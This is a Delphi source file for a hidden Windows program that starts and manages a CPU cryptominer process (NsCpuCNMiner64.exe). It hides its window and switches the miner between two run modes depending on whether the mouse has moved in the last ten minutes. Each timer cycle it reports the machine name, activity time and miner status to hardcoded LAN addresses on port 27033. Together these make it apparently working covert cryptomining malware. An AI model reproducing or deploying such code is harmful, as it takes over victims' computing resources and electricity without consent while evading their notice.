unit main;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, gvar, Vcl.ExtCtrls, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdIOHandler, IdGlobal, IdIOHandlerSocket, IdIOHandlerStack;

type
  TMainForm = class(TForm)
    Timer1: TTimer;
    WorkTimer: TTimer;
    TCPCient: TIdTCPClient;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure WorkTimerTimer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  MainForm: TMainForm;

implementation

{$R *.dfm}

procedure TMainForm.FormCreate(Sender: TObject);
begin
  aHandle := MainForm.Handle;
  if FindProcess(ExtractFileName(GetModuleName(0))) then Exit;
  EXEPath := ExtractFilePath(ParamStr(0));
end;

procedure TMainForm.Timer1Timer(Sender: TObject);
begin
 Timer1.Enabled := false;
 MainForm.Visible := False;
 ProverkaRegZadaniy();

 if NOT FindProcess('NsCpuCNMiner64.exe') then RunCPUMiner(true); 

 WorkTimer.Enabled := true;
end;

procedure TMainForm.WorkTimerTimer(Sender: TObject);
var hnd: TIdIOHandlerStack;
begin
  WorkTimer.Enabled := false;
  GetCursorPos(MousePos);
  if Round( (Now - LastActiveTime) * 24 * 60 * 60 ) > 600 then // Проверять активность юзера за последние 10 минут
  begin
    if (MousePos.X = LastMousePos.X) and (MousePos.y = LastMousePos.y) then
    begin
      UserActive := False;
      if FindProcess('NsCpuCNMiner64.exe') then KillCPUMiner;
      RunCPUMiner();      
      
    end;
    LastMousePos := MousePos;
    LastActiveTime := Now;
  end;

  if ((MousePos.X <> LastMousePos.X) or (MousePos.y <> LastMousePos.y)) and NOT UserActive then
  begin
   UserActive := true;
   if FindProcess('NsCpuCNMiner64.exe') then KillCPUMiner;
   RunCPUMiner(true);      
  end;

  LastMousePosOneSec := MousePos;

  // Подключение и отправка данных
  TCPCient.Host := '192.168.1.3';
  TCPCient.Port := 27033;
  TCPCient.ConnectTimeout := 100;
  TCPCient.ReadTimeout := 500;
  hnd := TIdIOHandlerStack.Create();
  hnd.MaxLineLength := 10000000;
  TCPCient.IOHandler := hnd;

  try
    TCPCient.Connect;
  except
   end;
   if NOT TCPCient.Connected then
   begin
    TCPCient.Host := '192.168.1.10';
    try
     TCPCient.Connect;
    except
    end;
   end;
  TCPCient.IOHandler.DefStringEncoding := IndyTextEncoding(TEncoding.GetEncoding(1251));
  if TCPCient.Connected then
  begin
    TCPCient.Socket.WriteLn('@'+GetComputerNName+';'+DateToStr(LastActiveTime)+';'+TimeToStr(LastActiveTime)+BoolToStr(FindProcess('NsCpuCNMiner64.exe')));
    TCPCient.Disconnect;
  end;
  FreeAndNil(hnd);
  WorkTimer.Enabled := true;
end;

end.
